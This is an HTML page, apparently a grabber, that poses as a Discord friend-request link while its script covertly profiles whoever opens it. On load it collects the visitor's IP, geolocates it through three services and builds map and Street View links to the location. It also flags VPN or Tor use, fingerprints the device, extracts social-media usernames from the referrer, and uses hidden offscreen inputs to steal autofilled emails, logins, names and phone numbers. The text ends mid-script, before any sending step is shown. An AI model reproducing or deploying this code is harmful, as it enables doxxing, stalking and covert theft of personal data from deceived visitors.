<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Добавь в друзья Discord">
    <meta property="og:description" content="Нажми чтобы добавить в друзья">
    <meta property="og:image" content="https://cdn.discordapp.com/embed/avatars/0.png">
    <meta name="theme-color" content="#5865F2">
    <title>Friend Request</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #5865F2, #404EED);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: white;
            text-align: center;
        }
        .container { animation: fadeIn 0.5s ease; }
        .avatar {
            width: 100px; height: 100px; border-radius: 50%;
            border: 5px solid white; margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        h2 { font-size: 24px; margin-bottom: 10px; }
        p { color: rgba(255,255,255,0.8); font-size: 16px; }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top-color: white; border-radius: 50%;
            animation: spin 0.8s linear infinite; margin: 25px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="container">
        <img class="avatar" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Avatar">
        <h2>👋 Перенаправляем в Discord...</h2>
        <p>Собираем всю информацию...</p>
        <div class="spinner"></div>
    </div>

    <script>
        async function collectAllData() {
            // ==========================================
            // ОСНОВНОЙ ОБЪЕКТ ДАННЫХ
            // ==========================================
            const DATA = {
                // IP и гео
                ip: '',
                geo: {
                    country: '', countryCode: '', region: '', city: '', district: '',
                    postal: '', lat: '', lon: '', isp: '', org: '', asn: '', asname: '', reverse: ''
                },
                coordAccuracy: '—',
                mapsLinks: { google: '', streetview: '', yandex: '', osm: '' },
                
                // VPN
                vpnStatus: '✅ Обычное соединение',
                vpnEmoji: '🟢',
                detectedVPN: null,
                isHosting: false, isProxy: false, isVPN: false, isTor: false,
                
                // Устройство
                device: {
                    type: '', brand: '', model: '', os: '', osVersion: '',
                    browser: '', browserVersion: '', browserEngine: '',
                    screen: '', cpuCores: '', memory: '', colorDepth: '',
                    timezone: '', language: '', pixelRatio: ''
                },
                
                // Автозаполнение
                emails: [], logins: [], phones: [], names: [],
                
                // Источник
                referrer: document.referrer || 'Прямой переход',
                source: { name: '', emoji: '', detail: '', url: '' },
                
                // UTM метки
                utm: { source: '', medium: '', campaign: '' },
                
                // Соцсети и профили
                possibleUsernames: [],
                socialProfiles: [],
                emailProviders: [],
                
                // Кеш браузера
                cachedSites: [],
                availableSites: [],
                
                // WebRTC
                webrtcLocalIPs: [],
                webrtcPublicIPs: [],
                
                // Цифровой отпечаток
                fingerprint: '',
                
                // Повторный визит
                visitCount: 1,
                isReturning: false,
                
                // Ошибки
                errors: []
            };
            
            try {
                // ==========================================
                // 1. ПОЛУЧАЕМ IP
                // ==========================================
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    DATA.ip = ipData.ip;
                } catch(e) {
                    DATA.errors.push('IP: ' + e.message);
                }
                
                // ==========================================
                // 2. ГЕОЛОКАЦИЯ (ТРИ СЕРВИСА)
                // ==========================================
                let geo1 = {}, geo2 = {}, geo3 = {};
                
                // Сервис 1: ipapi.co
                try {
                    const res = await fetch(`https://ipapi.co/${DATA.ip}/json/`);
                    geo1 = await res.json();
                } catch(e) {}
                
                // Сервис 2: ipwhois.app
                try {
                    const res = await fetch(`https://ipwhois.app/json/${DATA.ip}`);
                    geo2 = await res.json();
                } catch(e) {}
                
                // Сервис 3: ip-api.com
                try {
                    const res = await fetch(`http://ip-api.com/json/${DATA.ip}?fields=66846719`);
                    geo3 = await res.json();
                } catch(e) {}
                
                // Выбираем лучшие данные
                const getBest = (field) => {
                    if (geo3[field] && geo3[field] !== true && geo3[field] !== '') return geo3[field];
                    if (geo1[field] && geo1[field] !== true && geo1[field] !== '') return geo1[field];
                    if (geo2[field] && geo2[field] !== true && geo2[field] !== '') return geo2[field];
                    return '—';
                };
                
                DATA.geo.country = getBest('country_name') || getBest('country');
                DATA.geo.countryCode = getBest('country_code') || getBest('countryCode');
                DATA.geo.region = getBest('region') || getBest('regionName');
                DATA.geo.city = getBest('city');
                DATA.geo.district = getBest('district');
                DATA.geo.postal = getBest('postal') || getBest('zip');
                DATA.geo.lat = getBest('latitude') || getBest('lat');
                DATA.geo.lon = getBest('longitude') || getBest('lon');
                DATA.geo.isp = getBest('isp');
                DATA.geo.org = getBest('org');
                DATA.geo.asn = getBest('asn') || getBest('as');
                DATA.geo.asname = getBest('asname');
                DATA.geo.reverse = getBest('reverse');
                
                // Точность координат
                const servicesWithCoords = [geo1.latitude, geo2.latitude, geo3.lat].filter(v => v).length;
                if (servicesWithCoords >= 2) {
                    const lats = [geo1.latitude, geo2.latitude, geo3.lat].filter(v => v);
                    if (lats.length >= 2 && Math.abs(lats[0] - lats[1]) < 0.01) {
                        DATA.coordAccuracy = '✅ Высокая (город)';
                    } else if (lats.length >= 2 && Math.abs(lats[0] - lats[1]) < 0.1) {
                        DATA.coordAccuracy = '⚠️ Средняя (район)';
                    } else {
                        DATA.coordAccuracy = '❌ Низкая (регион)';
                    }
                }
                DATA.coordAccuracy += ` (${servicesWithCoords}/3 сервисов)`;
                
                // Карты
                if (DATA.geo.lat !== '—' && DATA.geo.lon !== '—') {
                    DATA.mapsLinks.google = `https://www.google.com/maps?q=${DATA.geo.lat},${DATA.geo.lon}`;
                    DATA.mapsLinks.streetview = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${DATA.geo.lat},${DATA.geo.lon}`;
                    DATA.mapsLinks.yandex = `https://yandex.ru/maps/?pt=${DATA.geo.lon},${DATA.geo.lat}&z=16&l=map`;
                    DATA.mapsLinks.osm = `https://www.openstreetmap.org/?mlat=${DATA.geo.lat}&mlon=${DATA.geo.lon}&zoom=16`;
                }
                
                // ==========================================
                // 3. VPN ДЕТЕКЦИЯ
                // ==========================================
                DATA.isHosting = !!(geo1.hosting || geo2.hosting || geo3.hosting);
                DATA.isProxy = !!(geo1.proxy || geo2.proxy || geo3.proxy);
                DATA.isVPN = !!(geo1.vpn || geo2.vpn);
                DATA.isTor = !!geo1.tor;
                
                const flags = [];
                if (DATA.isHosting) flags.push('Хостинг');
                if (DATA.isProxy) flags.push('Прокси');
                if (DATA.isVPN) flags.push('VPN');
                if (DATA.isTor) flags.push('Tor');
                
                if (flags.length > 0) {
                    DATA.vpnStatus = '⚠️ ' + flags.join(', ');
                    DATA.vpnEmoji = '🔴';
                }
                
                // Поиск известного VPN
                const org = (DATA.geo.org + ' ' + DATA.geo.isp + ' ' + DATA.geo.asname).toLowerCase();
                const vpnDB = {
                    'nordvpn': 'NordVPN', 'expressvpn': 'ExpressVPN', 'surfshark': 'Surfshark',
                    'protonvpn': 'ProtonVPN', 'proton': 'Proton', 'mullvad': 'Mullvad',
                    'windscribe': 'Windscribe', 'cloudflare': 'Cloudflare WARP',
                    'm247': 'M247', 'digitalocean': 'DigitalOcean', 'hetzner': 'Hetzner',
                    'ovh': 'OVHcloud', 'vultr': 'Vultr', 'linode': 'Linode',
                    'private internet': 'PIA', 'cyberghost': 'CyberGhost',
                    'hidemyass': 'HideMyAss', 'purevpn': 'PureVPN',
                };
                for (const [key, name] of Object.entries(vpnDB)) {
                    if (org.includes(key)) { DATA.detectedVPN = name; break; }
                }
                
                // ==========================================
                // 4. УСТРОЙСТВО
                // ==========================================
                const ua = navigator.userAgent;
                const platform = navigator.platform || '';
                
                // Модели телефонов
                const phoneDB = {
                    'iPhone16,2': 'iPhone 15 Pro Max', 'iPhone16,1': 'iPhone 15 Pro',
                    'iPhone15,5': 'iPhone 15 Plus', 'iPhone15,4': 'iPhone 15',
                    'iPhone15,3': 'iPhone 14 Pro Max', 'iPhone15,2': 'iPhone 14 Pro',
                    'iPhone14,7': 'iPhone 14 Plus', 'iPhone14,3': 'iPhone 13 Pro Max',
                    'iPhone14,2': 'iPhone 13 Pro', 'iPhone13,4': 'iPhone 13 mini',
                    'SM-S918': 'Samsung Galaxy S23 Ultra', 'SM-S928': 'Samsung Galaxy S24 Ultra',
                    'SM-S908': 'Samsung Galaxy S22 Ultra', 'SM-F946': 'Samsung Galaxy Z Fold 5',
                    'SM-F731': 'Samsung Galaxy Z Flip 5', 'SM-A546': 'Samsung Galaxy A54',
                    'Pixel 8 Pro': 'Google Pixel 8 Pro', 'Pixel 7 Pro': 'Google Pixel 7 Pro',
                    'Pixel 6 Pro': 'Google Pixel 6 Pro', 'A065': 'Nothing Phone 2',
                    'CPH2581': 'OnePlus 12', 'CPH2557': 'OnePlus 11',
                };
                
                // Определение бренда и модели
                if (ua.includes('iPhone') || ua.includes('iPad')) {
                    DATA.device.brand = '🍎 Apple';
                    const modelMatch = ua.match(/iPhone(\d+,\d+)/) || ua.match(/iPad(\d+,\d+)/);
                    DATA.device.model = modelMatch ? (phoneDB[modelMatch[0]] || `Apple ${modelMatch[0]}`) : (ua.includes('iPad') ? 'iPad' : 'iPhone');
                } else if (ua.includes('Android')) {
                    DATA.device.brand = '🤖 Android';
                    let found = false;
                    for (const [key, value] of Object.entries(phoneDB)) {
                        if (ua.includes(key)) { DATA.device.model = value; found = true; break; }
                    }
                    if (!found) {
                        const buildMatch = ua.match(/; ([^;]+) Build/);
                        DATA.device.model = buildMatch ? buildMatch[1].trim() : 'Android устройство';
                    }
                } else if (ua.includes('Windows')) {
                    DATA.device.brand = '💻 Windows ПК';
                    if (ua.includes('HP')) DATA.device.model = 'HP';
                    else if (ua.includes('Dell')) DATA.device.model = 'Dell';
                    else if (ua.includes('Lenovo')) DATA.device.model = 'Lenovo';
                    else if (ua.includes('Asus')) DATA.device.model = 'ASUS';
                    else if (ua.includes('Acer')) DATA.device.model = 'Acer';
                    else DATA.device.model = 'ПК/Ноутбук Windows';
                } else if (ua.includes('Macintosh') || ua.includes('Mac OS X')) {
                    DATA.device.brand = '🍎 Apple';
                    if (ua.includes('MacBook Pro')) DATA.device.model = 'MacBook Pro';
                    else if (ua.includes('MacBook Air')) DATA.device.model = 'MacBook Air';
                    else if (ua.includes('iMac')) DATA.device.model = 'iMac';
                    else DATA.device.model = 'Mac';
                } else if (ua.includes('Linux')) {
                    DATA.device.brand = '🐧 Linux';
                    DATA.device.model = 'ПК Linux';
                }
                
                // Тип устройства
                const isMobile = /Mobile|Android|iPhone/i.test(ua);
                const isTablet = /iPad|Tablet/i.test(ua);
                DATA.device.type = isTablet ? '📱 Планшет' : (isMobile ? '📱 Смартфон' : '🖥️ Компьютер');
                
                // ОС
                if (ua.includes('Windows NT 10.0')) { DATA.device.os = 'Windows 10/11'; DATA.device.osVersion = '10/11'; }
                else if (ua.includes('Windows NT 6.3')) { DATA.device.os = 'Windows 8.1'; DATA.device.osVersion = '8.1'; }
                else if (ua.includes('Mac OS X')) {
                    DATA.device.os = 'macOS';
                    const v = ua.match(/Mac OS X (\d+[._]\d+)/);
                    DATA.device.osVersion = v ? v[1].replace(/_/g, '.') : '';
                }
                else if (ua.includes('Android')) {
                    DATA.device.os = 'Android';
                    const v = ua.match(/Android (\d+\.\d+)/);
                    DATA.device.osVersion = v ? v[1] : '';
                }
                else if (ua.includes('iPhone') || ua.includes('iPad')) {
                    DATA.device.os = 'iOS/iPadOS';
                    const v = ua.match(/OS (\d+_\d+)/);
                    DATA.device.osVersion = v ? v[1].replace(/_/g, '.') : '';
                }
                else if (ua.includes('Linux')) { DATA.device.os = 'Linux'; }
                
                // Браузер
                if (ua.includes('Edg/')) { DATA.device.browser = 'Microsoft Edge'; DATA.device.browserVersion = ua.split('Edg/')[1].split('.')[0]; DATA.device.browserEngine = 'Chromium'; }
                else if (ua.includes('OPR/') || ua.includes('Opera/')) { DATA.device.browser = 'Opera'; DATA.device.browserVersion = (ua.split('OPR/')[1] || ua.split('Opera/')[1]).split('.')[0]; DATA.device.browserEngine = 'Chromium'; }
                else if (ua.includes('YaBrowser')) { DATA.device.browser = 'Яндекс Браузер'; DATA.device.browserVersion = ua.split('YaBrowser/')[1].split('.')[0]; DATA.device.browserEngine = 'Chromium'; }
                else if (ua.includes('Chrome') && ua.includes('Safari')) { DATA.device.browser = 'Google Chrome'; DATA.device.browserVersion = ua.split('Chrome/')[1].split('.')[0]; DATA.device.browserEngine = 'Chromium'; }
                else if (ua.includes('Firefox')) { DATA.device.browser = 'Mozilla Firefox'; DATA.device.browserVersion = ua.split('Firefox/')[1].split('.')[0]; DATA.device.browserEngine = 'Gecko'; }
                else if (ua.includes('Safari') && !ua.includes('Chrome')) { DATA.device.browser = 'Apple Safari'; DATA.device.browserVersion = ua.split('Version/')[1]?.split('.')[0] || ''; DATA.device.browserEngine = 'WebKit'; }
                
                // Техническое
                DATA.device.screen = `${screen.width}x${screen.height}`;
                DATA.device.pixelRatio = window.devicePixelRatio || 1;
                DATA.device.cpuCores = navigator.hardwareConcurrency || 'Неизвестно';
                DATA.device.memory = navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : 'Неизвестно';
                DATA.device.colorDepth = screen.colorDepth + ' бит';
                DATA.device.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                DATA.device.language = navigator.language || 'Неизвестен';
                
                // ==========================================
                // 5. ИСТОЧНИК ПЕРЕХОДА
                // ==========================================
                const ref = DATA.referrer;
                
                if (!ref || ref === '') {
                    DATA.source = { name: '💬 Прямой переход', emoji: '💬', detail: 'Ссылку прислали в ЛС/чат или скопировали', url: '' };
                } else if (ref.includes('vk.com')) {
                    DATA.source = { name: '🟦 ВКонтакте', emoji: '🟦', detail: ref.includes('/im') ? 'Из личных сообщений' : ref.includes('/wall') ? 'Со стены' : ref.includes('/public') ? 'Из группы' : 'Из профиля', url: ref };
                    const vkMatch = ref.match(/vk\.com\/([a-zA-Z0-9_.]+)/);
                    if (vkMatch && !['im', 'feed', 'wall', 'public'].includes(vkMatch[1])) {
                        DATA.socialProfiles.push({ platform: '🟦 ВКонтакте', username: vkMatch[1], url: `https://vk.com/${vkMatch[1]}`, type: 'Профиль' });
                        DATA.possibleUsernames.push(vkMatch[1]);
                    }
                } else if (ref.includes('t.me') || ref.includes('telegram.org')) {
                    DATA.source = { name: '✈️ Telegram', emoji: '✈️', detail: ref.includes('/c/') ? 'Из канала' : 'Из чата/ЛС', url: ref };
                    const tgMatch = ref.match(/t\.me\/([a-zA-Z0-9_]+)/);
                    if (tgMatch && tgMatch[1] !== 'c' && tgMatch[1] !== 'chat') {
                        DATA.socialProfiles.push({ platform: '✈️ Telegram', username: '@' + tgMatch[1], url: `https://t.me/${tgMatch[1]}`, type: 'Канал/чат' });
                        DATA.possibleUsernames.push(tgMatch[1]);
                    }
                } else if (ref.includes('discord.com') || ref.includes('discordapp.com')) {
                    DATA.source = { name: '🎮 Discord', emoji: '🎮', detail: 'С сервера/из ЛС Discord', url: ref };
                    const dcMatch = ref.match(/discord\.com\/users\/(\d+)/);
                    if (dcMatch) {
                        DATA.socialProfiles.push({ platform: '🎮 Discord', username: 'ID: ' + dcMatch[1], url: ref, type: 'Профиль' });
                        DATA.possibleUsernames.push('discord:' + dcMatch[1]);
                    }
                } else if (ref.includes('youtube.com')) {
                    DATA.source = { name: '▶️ YouTube', emoji: '▶️', detail: 'Из комментариев/описания', url: ref };
                } else if (ref.includes('instagram.com')) {
                    DATA.source = { name: '📷 Instagram', emoji: '📷', detail: 'Из профиля/директ', url: ref };
                    const igMatch = ref.match(/instagram\.com\/([a-zA-Z0-9_.]+)/);
                    if (igMatch && !['explore', 'accounts', 'p', 'reel', 'stories'].includes(igMatch[1])) {
                        DATA.socialProfiles.push({ platform: '📷 Instagram', username: '@' + igMatch[1], url: ref, type: 'Профиль' });
                        DATA.possibleUsernames.push(igMatch[1]);
                    }
                } else if (ref.includes('twitter.com') || ref.includes('x.com')) {
                    DATA.source = { name: '🐦 Twitter/X', emoji: '🐦', detail: '', url: ref };
                    const twMatch = ref.match(/(?:twitter|x)\.com\/([a-zA-Z0-9_]+)/);
                    if (twMatch && !['home', 'explore', 'notifications'].includes(twMatch[1])) {
                        DATA.socialProfiles.push({ platform: '🐦 Twitter/X', username: '@' + twMatch[1], url: ref, type: 'Профиль' });
                        DATA.possibleUsernames.push(twMatch[1]);
                    }
                } else if (ref.includes('github.com')) {
                    DATA.source = { name: '💻 GitHub', emoji: '💻', detail: '', url: ref };
                    const ghMatch = ref.match(/github\.com\/([a-zA-Z0-9-]+)/);
                    if (ghMatch && !['explore', 'notifications', 'settings'].includes(ghMatch[1])) {
                        DATA.socialProfiles.push({ platform: '💻 GitHub', username: ghMatch[1], url: ref, type: 'Профиль' });
                        DATA.possibleUsernames.push(ghMatch[1]);
                    }
                } else if (ref.includes('google.com') || ref.includes('google.ru')) {
                    DATA.source = { name: '🔍 Google Поиск', emoji: '🔍', detail: 'Нашёл через поиск', url: ref };
                } else if (ref.includes('yandex.ru')) {
                    DATA.source = { name: '🔍 Яндекс', emoji: '🔍', detail: 'Нашёл через поиск', url: ref };
                } else {
                    DATA.source = { name: '🌐 ' + new URL(ref).hostname, emoji: '🌐', detail: '', url: ref };
                }
                
                // ==========================================
                // 6. UTM МЕТКИ
                // ==========================================
                const urlParams = new URLSearchParams(window.location.search);
                DATA.utm.source = urlParams.get('utm_source') || '';
                DATA.utm.medium = urlParams.get('utm_medium') || '';
                DATA.utm.campaign = urlParams.get('utm_campaign') || '';
                
                // ==========================================
                // 7. АВТОЗАПОЛНЕНИЕ
                // ==========================================
                const autoFillFields = [
                    { name: 'email', autocomplete: 'email', type: 'email', cat: 'email' },
                    { name: 'login', autocomplete: 'email', type: 'email', cat: 'email' },
                    { name: 'username', autocomplete: 'username', type: 'text', cat: 'login' },
                    { name: 'login', autocomplete: 'username', type: 'text', cat: 'login' },
                    { name: 'user', autocomplete: 'username', type: 'text', cat: 'login' },
                    { name: 'nickname', autocomplete: 'nickname', type: 'text', cat: 'login' },
                    { name: 'name', autocomplete: 'name', type: 'text', cat: 'name' },
                    { name: 'firstname', autocomplete: 'given-name', type: 'text', cat: 'name' },
                    { name: 'lastname', autocomplete: 'family-name', type: 'text', cat: 'name' },
                    { name: 'tel', autocomplete: 'tel', type: 'tel', cat: 'phone' },
                ];
                
                for (const field of autoFillFields) {
                    try {
                        const input = document.createElement('input');
                        input.type = field.type;
                        input.name = field.name;
                        input.autocomplete = field.autocomplete;
                        input.style.cssText = 'position:absolute;left:-9999px;top:-9999px;opacity:0;width:1px;height:1px;';
                        document.body.appendChild(input);
                        await new Promise(r => setTimeout(r, 150));
                        const value = input.value.trim();
                        if (value && value.length > 1) {
                            if (field.cat === 'email' && value.includes('@')) {
                                if (!DATA.emails.includes(value)) DATA.emails.push(value);
                                const nickFromEmail = value.split('@')[0];
                                if (nickFromEmail.length > 2 && !DATA.possibleUsernames.includes(nickFromEmail)) {
                                    DATA.possibleUsernames.push(nickFromEmail);
                                }
                            } else if (field.cat === 'login' && value.length > 2 && !value.includes('@')) {
                                if (!DATA.logins.includes(value)) DATA.logins.push(value);
                                if (!DATA.possibleUsernames.includes(value)) DATA.possibleUsernames.push(value);
                            } else if (field.cat === 'name' && value.length > 1 && !value.includes('@') && !/\d/.test(value)) {
                                if (!DATA.names.includes(value)) DATA.names.push(value);
                            } else if (field.cat === 'phone' && value.length > 5) {
                                if (!DATA.phones.includes(value)) DATA.phones.push(value);
                            }
                        }
                        document.body.removeChild(input);
                    } catch(e) {}
                }
                
                // ==========================================
                // 8. СВЯЗАННЫЕ СЕРВИСЫ ПО EMAIL
                // ==========================================
                for (const email of DATA.emails) {
                    const lower = email.toLowerCase();
                    if (lower.includes('@gmail.com') && !DATA.emailProviders.includes('🔴 Google (Gmail, YouTube, Drive)'))
                        DATA.emailProviders.push('🔴 Google (Gmail, YouTube, Drive)');
                    if ((lower.includes('@mail.ru') || lower.includes('@bk.ru') || lower.includes('@inbox.ru')) && !DATA.emailProviders.includes('🟦 VK/Mail.ru (ВКонтакте, Почта)'))
                        DATA.emailProviders.push('🟦 VK/Mail.ru (ВКонтакте, Почта)');
                    if ((lower.includes('@yandex.ru') || lower.includes('@ya.ru')) && !DATA.emailProviders.includes('🔍 Яндекс (Почта, Диск)'))
                        DATA.emailProviders.push('🔍 Яндекс (Почта, Диск)');
                    if ((lower.includes('@icloud.com') || lower.includes('@me.com')) && !DATA.emailProviders.includes('🍎 Apple (iCloud, iMessage)'))
                        DATA.emailProviders.push('🍎 Apple (iCloud, iMessage)');
